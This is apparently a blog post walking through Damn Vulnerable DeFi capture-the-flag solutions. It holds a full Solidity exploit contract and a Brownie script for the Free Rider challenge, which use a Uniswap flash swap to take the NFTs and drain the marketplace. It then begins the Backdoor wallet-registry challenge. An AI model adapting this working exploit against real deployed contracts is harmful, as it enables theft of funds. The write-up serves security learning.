class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">FreeRiderNFTMarketplace</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">buyMany</span>(<span class="params">uint256[] calldata tokenIds</span>) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract freerider_Exploit is <span class="title class_">IUniswapV</span>2Callee &#123;</span><br><span class="line">    <span class="title class_">WETH9</span> weth;</span><br><span class="line">    <span class="title class_">IUniswapV</span>2Pair pair;</span><br><span class="line">    <span class="title class_">IERC721</span> nft;</span><br><span class="line">    <span class="title class_">FreeRiderNFTMarketplace</span> market;</span><br><span class="line">    address buyer;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">Log</span>(string message, uint256 val);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address _weth,</span></span><br><span class="line"><span class="params">        address _pair,</span></span><br><span class="line"><span class="params">        address _nft,</span></span><br><span class="line"><span class="params">        address _market,</span></span><br><span class="line"><span class="params">        address _buyer</span></span><br><span class="line"><span class="params">    </span>) payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> &gt;= <span class="number">0.5</span> ether);</span><br><span class="line">        pair = <span class="title class_">IUniswapV</span>2Pair(_pair);</span><br><span class="line">        nft = <span class="title class_">IERC721</span>(_nft);</span><br><span class="line">        market = <span class="title class_">FreeRiderNFTMarketplace</span>(_market);</span><br><span class="line">        buyer = _buyer;</span><br><span class="line">        weth = <span class="title class_">WETH9</span>(_weth);</span><br><span class="line">        weth.<span class="property">deposit</span>&#123;<span class="attr">value</span>: <span class="number">0.5</span> ether&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">address</span>(pair) != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;!pair&quot;</span>);</span><br><span class="line"></span><br><span class="line">        address token0 = pair.<span class="title function_">token0</span>();</span><br><span class="line">        address token1 = pair.<span class="title function_">token1</span>();</span><br><span class="line">        uint256 amount0Out = <span class="title function_">address</span>(weth) == token0 ? <span class="number">15</span> ether : <span class="number">0</span>;</span><br><span class="line">        uint256 amount1Out = <span class="title function_">address</span>(weth) == token1 ? <span class="number">15</span> ether : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// need to pass some data to trigger uniswapV2Call</span></span><br><span class="line">        bytes memory data = abi.<span class="title function_">encode</span>(<span class="title function_">address</span>(weth), <span class="number">15</span> ether);</span><br><span class="line"></span><br><span class="line">        pair.<span class="title function_">swap</span>(amount0Out, amount1Out, <span class="title function_">address</span>(<span class="variable language_">this</span>), data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// called by pair contract</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">uniswapV2Call</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address _sender,</span></span><br><span class="line"><span class="params">        uint256 _amount0,</span></span><br><span class="line"><span class="params">        uint256 _amount1,</span></span><br><span class="line"><span class="params">        bytes calldata _data</span></span><br><span class="line"><span class="params">    </span>) external override &#123;</span><br><span class="line">        <span class="comment">// require(msg.sender == address(pair), &quot;!pair&quot;);</span></span><br><span class="line">        <span class="built_in">require</span>(_sender == <span class="title function_">address</span>(<span class="variable language_">this</span>), <span class="string">&quot;!sender&quot;</span>);</span><br><span class="line"></span><br><span class="line">        (address tokenBorrow, uint256 amount) = abi.<span class="title function_">decode</span>(</span><br><span class="line">            _data,</span><br><span class="line">            (address, uint256)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// about 0.3%</span></span><br><span class="line">        uint256 fee = ((amount * <span class="number">3</span>) / <span class="number">997</span>) + <span class="number">1</span>;</span><br><span class="line">        uint256 amountToRepay = amount + fee;</span><br><span class="line"></span><br><span class="line">        uint256[] memory <span class="title class_">Ids</span> = <span class="keyword">new</span> uint256[](<span class="number">6</span>);</span><br><span class="line">        <span class="comment">// Ids = [uint256(0), 1, 2, 3, 4, 5];</span></span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">            <span class="title class_">Ids</span>[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        weth.<span class="title function_">withdraw</span>(<span class="number">15</span> ether);</span><br><span class="line">        market.<span class="property">buyMany</span>&#123;<span class="attr">value</span>: <span class="number">15</span> ether&#125;(<span class="title class_">Ids</span>);</span><br><span class="line">        weth.<span class="property">deposit</span>&#123;<span class="attr">value</span>: <span class="number">15</span> ether&#125;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">            nft.<span class="title function_">safeTransferFrom</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), buyer, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">payable</span>(tx.<span class="property">origin</span>).<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">IERC20</span>(tokenBorrow).<span class="title function_">transfer</span>(<span class="title function_">address</span>(pair), amountToRepay);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">onERC721Received</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address,</span></span><br><span class="line"><span class="params">        address,</span></span><br><span class="line"><span class="params">        uint256 _tokenId,</span></span><br><span class="line"><span class="params">        bytes memory</span></span><br><span class="line"><span class="params">    </span>) external returns (bytes4) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">IERC721Receiver</span>.<span class="property">onERC721Received</span>.<span class="property">selector</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="freerider-py"><a href="#freerider-py" class="headerlink" title="freerider.py"></a>freerider.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> (WETH9, Contract, DamnValuableNFT, DamnValuableToken,</span><br><span class="line">                     FreeRiderBuyer, FreeRiderNFTMarketplace, accounts, chain, freerider_Exploit)</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">RANDOM_ADDRESS = <span class="string">&#x27;0x5832727e34162736F3e7082EDad9DCfD76e15D0a&#x27;</span></span><br><span class="line">RANDOM_ADDRESS_PK = <span class="string">&#x27;57f7f022e5941d0573114e2aab6e08aeb9a6f28b42d48e63a374783d7f1fdadb&#x27;</span></span><br><span class="line"></span><br><span class="line">ATTACKER_INITIAL_ETH_BALANCE = Web3.toWei(<span class="number">0.5</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line">NFT_PRICE = Web3.toWei(<span class="number">15</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line">AMOUNT_OF_NFTS = <span class="number">6</span></span><br><span class="line">MARKETPLACE_INITIAL_ETH_BALANCE = Web3.toWei(<span class="number">90</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line">BUYER_PAYOUT = Web3.toWei(<span class="number">45</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line">UNISWAP_INITIAL_TOKEN_RESERVE = Web3.toWei(<span class="number">15000</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line">UNISWAP_INITIAL_WETH_RESERVE = Web3.toWei(<span class="number">9000</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_json</span>(<span class="params">json_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;./scripts/build-uniswap-v2/<span class="subst">&#123;json_file&#125;</span>&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        contract_metadata = json.loads(f.read())</span><br><span class="line">        contract_abi = contract_metadata[<span class="string">&#x27;abi&#x27;</span>]</span><br><span class="line">        contract_bytecode = contract_metadata[<span class="string">&#x27;bytecode&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> contract_abi, contract_bytecode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deploy_bytecode</span>(<span class="params">contract_abi, contract_bytecode, *args</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This will connect to Brownie&#x27;s ganache instance</span></span><br><span class="line">    w3_client = Web3(Web3.HTTPProvider(<span class="string">&#x27;http://0.0.0.0:8545&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    temp_contract = w3_client.eth.contract(</span><br><span class="line">        abi=contract_abi, bytecode=contract_bytecode)</span><br><span class="line">    n = w3_client.eth.get_transaction_count(RANDOM_ADDRESS)</span><br><span class="line"></span><br><span class="line">    tx = temp_contract.constructor(*args).buildTransaction(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: RANDOM_ADDRESS, <span class="string">&#x27;nonce&#x27;</span>: n, <span class="string">&#x27;gasPrice&#x27;</span>: w3_client.eth.gas_price&#125;</span><br><span class="line">    )</span><br><span class="line">    signed_tx = w3_client.eth.account.sign_transaction(</span><br><span class="line">        tx, private_key=RANDOM_ADDRESS_PK)</span><br><span class="line"></span><br><span class="line">    accounts[<span class="number">0</span>].transfer(RANDOM_ADDRESS, <span class="string">&#x27;1 ether&#x27;</span>)</span><br><span class="line">    txh = w3_client.eth.send_raw_transaction(signed_tx.rawTransaction)</span><br><span class="line">    tx_receipt = w3_client.eth.wait_for_transaction_receipt(txh)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tx_receipt.contractAddress</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scenario_setup</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># deploy script is from https://github.com/nahueldsanchez/dvd_brownie</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set attacker account</span></span><br><span class="line">    ATTACKER_ACCOUNT = accounts.add()</span><br><span class="line">    accounts[<span class="number">1</span>].transfer(ATTACKER_ACCOUNT, <span class="string">&#x27;0.5 ether&#x27;</span>)</span><br><span class="line">    <span class="keyword">assert</span> ATTACKER_ACCOUNT.balance() == ATTACKER_INITIAL_ETH_BALANCE</span><br><span class="line">    <span class="comment"># ####################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set buyer account</span></span><br><span class="line">    BUYER_ACCOUNT = accounts.add()</span><br><span class="line">    accounts[<span class="number">1</span>].transfer(BUYER_ACCOUNT, <span class="string">&#x27;50 ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Deploy DVT and WETH9</span></span><br><span class="line">    damn_valuable_token = DamnValuableToken.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line">    weth9 = WETH9.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line">    <span class="comment"># ####################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Deploy UNISWAP V2 Factory</span></span><br><span class="line">    uniswap_v2_factory_abi, uniswap_v2_factory_bytecode = load_json(</span><br><span class="line">        <span class="string">&#x27;UniswapV2Factory.json&#x27;</span>)</span><br><span class="line">    uniswap_v2_factory_address = deploy_bytecode(</span><br><span class="line">        uniswap_v2_factory_abi, uniswap_v2_factory_bytecode, <span class="string">&#x27;0x0000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    uniswap_v2_factory = Contract.from_abi(</span><br><span class="line">        <span class="string">&#x27;UniswapV2Factory&#x27;</span>, uniswap_v2_factory_address, uniswap_v2_factory_abi</span><br><span class="line">    )</span><br><span class="line">    <span class="comment">###########################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Deploy UNISWAP V2 Router</span></span><br><span class="line">    uniswap_v2_router_abi, uniswap_v2_router_bytecode = load_json(</span><br><span class="line">        <span class="string">&#x27;UniswapV2Router02.json&#x27;</span>)</span><br><span class="line">    uniswap_v2_router_address = deploy_bytecode(</span><br><span class="line">        uniswap_v2_router_abi, uniswap_v2_router_bytecode, uniswap_v2_factory.address, weth9.address)</span><br><span class="line">    uniswap_v2_router = Contract.from_abi(</span><br><span class="line">        <span class="string">&#x27;UniswapV2Router&#x27;</span>, uniswap_v2_router_address, uniswap_v2_router_abi)</span><br><span class="line">    <span class="comment">#############################</span></span><br><span class="line"></span><br><span class="line">    damn_valuable_token.approve(</span><br><span class="line">        uniswap_v2_router, UNISWAP_INITIAL_TOKEN_RESERVE, &#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line">    deadline = chain[-<span class="number">1</span>].timestamp * <span class="number">2</span></span><br><span class="line">    tx = uniswap_v2_router.addLiquidityETH(damn_valuable_token.address, UNISWAP_INITIAL_TOKEN_RESERVE, <span class="number">0</span>, <span class="number">0</span>, RANDOM_ADDRESS, deadline, &#123;</span><br><span class="line">                                           <span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>], <span class="string">&#x27;value&#x27;</span>: UNISWAP_INITIAL_WETH_RESERVE&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Deploy UNISWAP v2 Pair</span></span><br><span class="line">    uniswap_v2_pair_abi, uniswap_v2_pair_bytecode = load_json(</span><br><span class="line">        <span class="string">&#x27;UniswapV2Pair.json&#x27;</span>)</span><br><span class="line">    uniswap_v2_pair = Contract.from_abi(</span><br><span class="line">        <span class="string">&#x27;UniswapV2Pair&#x27;</span>, uniswap_v2_factory.getPair(</span><br><span class="line">            weth9, damn_valuable_token), uniswap_v2_pair_abi</span><br><span class="line">    )</span><br><span class="line">    <span class="comment">########################</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> uniswap_v2_pair.token0() == damn_valuable_token</span><br><span class="line">    <span class="keyword">assert</span> uniswap_v2_pair.token1() == weth9</span><br><span class="line">    <span class="keyword">assert</span> uniswap_v2_pair.balanceOf(RANDOM_ADDRESS) &gt; <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    marketplace = FreeRiderNFTMarketplace.deploy(</span><br><span class="line">        AMOUNT_OF_NFTS, &#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>], <span class="string">&#x27;value&#x27;</span>: MARKETPLACE_INITIAL_ETH_BALANCE&#125;)</span><br><span class="line">    nft = DamnValuableNFT.at(marketplace.token())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">range</span>(AMOUNT_OF_NFTS):</span><br><span class="line">        <span class="keyword">assert</span> nft.ownerOf(<span class="built_in">id</span>) == accounts[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    nft.setApprovalForAll(marketplace, <span class="literal">True</span>, &#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line"></span><br><span class="line">    marketplace.offerMany([x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)], [</span><br><span class="line">                          NFT_PRICE <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)], &#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line">    <span class="keyword">assert</span> marketplace.amountOfOffers() == <span class="number">6</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> uniswap_v2_pair, marketplace, nft, weth9, ATTACKER_ACCOUNT, BUYER_ACCOUNT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup_buyer_contract</span>(<span class="params">partner_address, nft_address, buyer_account</span>):</span><br><span class="line">    buyer_contract = FreeRiderBuyer.deploy(partner_address, nft_address, &#123;</span><br><span class="line">                                           <span class="string">&#x27;from&#x27;</span>: buyer_account, <span class="string">&#x27;value&#x27;</span>: BUYER_PAYOUT&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> buyer_contract</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">uniswap_v2_pair, marketplace, nft, weth9, ATTACKER_ACCOUNT, buyer_contract</span>):</span><br><span class="line">    exploit = freerider_Exploit.deploy(weth9, uniswap_v2_pair, nft, marketplace, buyer_contract, &#123;</span><br><span class="line">        <span class="string">&#x27;from&#x27;</span>: ATTACKER_ACCOUNT, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;0.5 ether&#x27;</span>&#125;)</span><br><span class="line">    exploit.exploit(&#123;<span class="string">&#x27;from&#x27;</span>: ATTACKER_ACCOUNT&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after</span>(<span class="params">marketplace, nft, buyer_contract, buyer, attacker</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> attacker.balance() &gt; BUYER_PAYOUT</span><br><span class="line">    <span class="keyword">assert</span> buyer_contract.balance() == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(AMOUNT_OF_NFTS):</span><br><span class="line">        nft.transferFrom(buyer_contract, buyer, i, &#123;<span class="string">&#x27;from&#x27;</span>: buyer&#125;)</span><br><span class="line">        <span class="keyword">assert</span> nft.ownerOf(i) == buyer</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> marketplace.amountOfOffers() == <span class="number">0</span></span><br><span class="line">    <span class="keyword">assert</span> marketplace.balance() &lt; MARKETPLACE_INITIAL_ETH_BALANCE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    uniswap_v2_pair, marketplace, nft, weth9, ATTACKER_ACCOUNT, BUYER_ACCOUNT = scenario_setup()</span><br><span class="line">    buyer_contract = setup_buyer_contract(ATTACKER_ACCOUNT, nft, BUYER_ACCOUNT)</span><br><span class="line"></span><br><span class="line">    exploit(uniswap_v2_pair, marketplace, nft,</span><br><span class="line">            weth9, ATTACKER_ACCOUNT, buyer_contract)</span><br><span class="line"></span><br><span class="line">    after(marketplace, nft, buyer_contract, BUYER_ACCOUNT, ATTACKER_ACCOUNT)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h2><p>To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.</p>
<p>To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.</p>
<p>Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.</p>
<p>Your goal is to take all funds from the registry. In a single transaction.</p>
<h3 id="WalletRegistry-sol"><a href="#WalletRegistry-sol" class="headerlink" title="WalletRegistry.sol"></a>WalletRegistry.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/access/Ownable.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">WalletRegistry</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@notice</span> A registry for Gnosis Safe wallets.</span></span><br><span class="line"><span class="comment">           When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@dev</span> The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">WalletRegistry</span> is <span class="title class_">IProxyCreationCallback</span>, <span class="title class_">Ownable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    uint256 private constant <span class="variable constant_">MAX_OWNERS</span> = <span class="number">1</span>;</span><br><span class="line">    uint256 private constant <span class="variable constant_">MAX_THRESHOLD</span> = <span class="number">1</span>;</span><br><span class="line">    uint256 private constant <span class="variable constant_">TOKEN_PAYMENT</span> = <span class="number">10</span> ether; <span class="comment">// 10 * 10 ** 18</span></span><br><span class="line">    </span><br><span class="line">    address public immutable masterCopy;</span><br><span class="line">    address public immutable walletFactory;</span><br><span class="line">    <span class="title class_">IERC20</span> public immutable token;</span><br><span class="line"></span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> bool) public beneficiaries;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// owner =&gt; wallet</span></span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> address) public wallets;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address masterCopyAddress,</span></span><br><span class="line"><span class="params">        address walletFactoryAddress, </span></span><br><span class="line"><span class="params">        address tokenAddress,</span></span><br><span class="line"><span class="params">        address[] memory initialBeneficiaries</span></span><br><span class="line"><span class="params">    </span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(masterCopyAddress != <span class="title function_">address</span>(<span class="number">0</span>));</span><br><span class="line">        <span class="built_in">require</span>(walletFactoryAddress != <span class="title function_">address</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">        masterCopy = masterCopyAddress;</span><br><span class="line">        walletFactory = walletFactoryAddress;</span><br><span class="line">        token = <span class="title class_">IERC20</span>(tokenAddress);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; initialBeneficiaries.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="title function_">addBeneficiary</span>(initialBeneficiaries[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">addBeneficiary</span>(<span class="params">address beneficiary</span>) public onlyOwner &#123;</span><br><span class="line">        beneficiaries[beneficiary] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_removeBeneficiary</span>(<span class="params">address beneficiary</span>) private &#123;</span><br><span class="line">        beneficiaries[beneficiary] = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     <span class="doctag">@notice</span> Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback</span></span><br><span class="line"><span class="comment">             setting the registry&#x27;s address as the callback.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title 